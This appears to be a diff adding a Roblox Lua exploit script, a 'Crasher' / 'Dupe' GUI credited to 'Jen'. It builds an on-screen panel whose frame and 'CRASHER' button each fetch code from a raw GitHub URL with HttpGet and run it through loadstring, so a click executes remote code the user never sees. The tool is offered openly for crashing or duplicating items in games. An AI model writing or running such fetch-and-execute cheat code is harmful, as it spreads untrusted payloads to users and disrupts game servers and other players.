@@ -1,0 +1,42 @@
+-- Crasher Gui Made By Jen
+
+local ScreenGui = Instance.new("ScreenGui")
+local MainDupe = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local Crash = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.coreGui
+
+MainDupe.Name = "MainDupe"
+MainDupe.Parent = ScreenGui
+MainDupe.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
+MainDupe.Position = UDim2.new(0.0741444901, 0, 0.0472440943, 0)
+MainDupe.Size = UDim2.new(0, 261, 0, 121)
+MainDupe.Active = true
+MainDupe.Draggable = true
+
+TextLabel.Parent = MainDupe
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 237, 29)
+TextLabel.Size = UDim2.new(0, 261, 0, 50)
+TextLabel.Font = Enum.Font.ArialBold
+TextLabel.Text = "DUPE GUI BY JENALD"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 21.000
+MainDupe.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/pbouchelle/Cyroo/main/Dupe/Gui/jen"))()
+end)
+
+Crash.Name = "Crash"
+Crash.Parent = MainDupe
+Crash.BackgroundColor3 = Color3.fromRGB(0, 194, 0)
+Crash.Position = UDim2.new(0.253084511, 0, 0.517605066, 0)
+Crash.Size = UDim2.new(0, 135, 0, 42)
+Crash.Font = Enum.Font.ArialBold
+Crash.Text = "CRASHER "
+Crash.TextColor3 = Color3.fromRGB(0, 0, 0)
+Crash.TextSize = 20.000
+Crash.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/pbouchelle/Cyroo/main/Dupe/Gui/jen"))()
+end)
